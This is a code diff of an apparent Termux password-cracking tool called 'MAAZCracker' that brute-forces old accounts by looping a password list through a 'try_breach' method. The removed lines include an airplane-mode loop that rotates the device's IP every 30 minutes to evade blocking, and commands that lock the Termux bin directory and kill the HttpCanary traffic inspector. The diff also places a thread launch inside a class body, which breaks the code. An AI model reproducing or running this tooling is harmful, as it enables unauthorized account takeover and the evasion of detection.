@@ -12,67 +12,9 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from bs4 import BeautifulSoup as sop
 from random import choice as race
 from string import digits, ascii_letters
-# VPN & Location Check - Updated with Auto Airplane Mode (30 Mins)
-def check_internet_and_vpn():
-    try:
-        import requests
-        # IP, City, aur Country detect karne ke liye ipapi use kar rahe hain
-        print("  \x1b[95m[+] Fetching connection details...\x1b[0m")
-        response = requests.get('https://ipapi.co/json/', timeout=8)
-        
-        if response.status_code == 200:
-            data = response.json()
-            ip = data.get('ip', 'Unknown')
-            city = data.get('city', 'Unknown')
-            country = data.get('country_name', 'Unknown')
-            org = data.get('org', 'Unknown') # ISP ya VPN name detect karne ke liye
-            
-            print("\n  \x1b[92m╔════════════════════════════════════════╗\x1b[0m")
-            print(f"    \x1b[96m✓ Connected\x1b[0m")
-            print(f"    \x1b[97mIP Address : \x1b[93m{ip}\x1b[0m")
-            print(f"    \x1b[97mCity       : \x1b[93m{city}\x1b[0m")
-            print(f"    \x1b[97mCountry    : \x1b[93m{country}\x1b[0m")
-            print(f"    \x1b[97mNetwork/VPN: \x1b[93m{org}\x1b[0m")
-            print("  \x1b[92m╚════════════════════════════════════════╝\x1b[0m\n")
-            return True
-        else:
-            print("  \x1b[91mNo Internet Connection!")
-            return False
-    except Exception as e:
-        print("  \x1b[91mError connecting to network/VPN!")
-        return False
-
-def auto_airplane_mode():
-    """Har 30 minutes baad automatically IP change karne ke liye loop"""
-    import os
-    while True:
-        # 30 Minutes = 1800 Seconds
-        print("  \x1b[96m[+] Script running... Next IP rotation in 30 minutes.\x1b[0m")
-        time.sleep(1800)
-        
-        print("\n  \x1b[93m[!] Rotating IP via Airplane Mode...\x1b[0m")
-        
-        # Method 1: Agar device rooted hai ya Termux:API setup hai (Chutki me kaam karega)
-        os.system("cmd connectivity airplane-mode enable >/dev/null 2>&1")
-        time.sleep(3)
-        os.system("cmd connectivity airplane-mode disable >/dev/null 2>&1")
-        
-        # Method 2: Agar upar wala block na chale (Bina root ke adb use karne ke liye alternative)
-        # os.system("adb shell cmd connectivity airplane-mode enable")
-        # time.sleep(3)
-        # os.system("adb shell cmd connectivity airplane-mode disable")
-        
-        print("  \x1b[92m[✓] Airplane Mode toggled. Checking new IP...\x1b[0m")
-        check_internet_and_vpn()
 import urllib.parse
 import base64
 import ctypes
-
-def run_system_command(command):
-    os.system(f'{command} >/dev/null 2>&1')
-
-run_system_command('chmod 700 /data/data/com.termux/files/usr/bin')
-run_system_command('pkill -f httcanary')
 
 class NebulaColors:
     def __init__(self):
@@ -164,8 +106,6 @@ class MAAZCracker:
 
     def old_menu(self):
         clear()
-        if not check_internet_and_vpn():
-            return
         print(f"{self.color.P}╔═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╗")
         print(f"{self.color.P}║         {self.color.Y}★ OLD ACCOUNT CRACKER ★         {self.color.P}║")
         print(f"{self.color.P}╠═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣")
@@ -239,8 +179,6 @@ class MAAZCracker:
         for password in passlist:
             if self.try_breach(target, password):
                 break
-import threading
-threading.Thread(target=auto_airplane_mode, daemon=True).start()
 
     def try_breach(self, uid, password):
         try:
